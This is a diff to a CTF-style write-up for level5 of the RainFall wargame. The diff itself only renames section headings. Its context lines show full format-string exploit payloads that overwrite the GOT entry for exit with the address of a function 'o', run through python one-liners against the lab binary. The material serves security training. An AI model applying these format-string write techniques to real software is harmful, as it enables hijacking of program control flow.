@@ -50,7 +50,9 @@ level5@RainFall:~$ objdump -R level5 | grep exit
 
 Address of exit is `08049838` == `\x38\x98\x04\x08`
 
-## Payload
+### Payload
+
+## Option 1
 
 value to write = adress of o = `0x080484a4` = `134513828`
 
@@ -78,6 +80,8 @@ exploit += "%5$hn"
 
 run < <(python -c 'print ("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%3$33948x" + "%3$n" + "%3$33624x" + "%4$n")';)
 ```
+
+## Option 2
 
 Needs to overwrite 0x08049838 (exit) with 0x080484a4 (o)
 
@@ -107,7 +111,7 @@ It'ill be : \x38\x98\x04\x08\x3a\x98\x04\x08%33948x%4$hn%33632x%5$hn
 (python -c 'print ("\x38\x98\x04\x08\x3a\x98\x04\x08%33948x%4$hn%33632x%5$hn")';cat) | ./level5
 ```
 
-## Second try
+## Option 3
 
 Needs to overwrite 0x08049838 (exit) with 0x080484a4 (o)
 
